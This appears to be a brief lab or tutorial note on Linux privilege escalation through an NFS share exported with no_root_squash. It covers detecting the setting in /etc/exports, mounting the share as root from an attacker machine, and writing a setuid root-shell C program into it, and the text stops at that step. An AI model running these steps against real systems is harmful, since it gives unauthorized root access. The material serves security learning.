Privilege Escalation using NFS Share
=====================================

Some Conception:

NFS is a Network File Sharing protocol that allows users to share directories and files over the network across different operating systems.
It will enable remote systems to be accessible locally when the shares are mounted.
** The accessibility of the NFS shares is based on whatever privileges are assigned to the share. **

SCOPE: 
If NFS is misconfigured we it can provide an attacker with unauthorized access to sensitive data 

/etc/exports: Significance of this option.
 if you find some directory that is configured as no_root_squash, then you can access it from as a client and write inside that directory as if you
 were the local root of the machine.
 
 no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to
 serious security implications.
 
 no_all_squash: This is similar to no_root_squash option but applies to non-root users
 
 NOTE ON EXPLOITING for 'no_all-squash' option.
 Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; 
 create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
 
 
 
 
 
DETECTION:

cat /etc/exports

 GOt following output:



# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)


Note: we've found that no_root_squash option is present for /tmp share.

EXPLOITATION:

IN ATTACKER VM:

(a) showmount -e TARGET_IP 

Explanation:
option : -e means list all exports
The output:
Export list for 10.10.240.117:
/tmp *

(b)
So we know that /tmp of target is shared

(c) create a folder in attacker machine

mkdir /tmp/1

(d) Now mount target's /tmp in attacker's /tmp/1

mount -o rw,vers=3 10.10.240.117:/tmp /tmp/1

(we must be as root in attacker machine)

(c) Now create exploit in shared
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
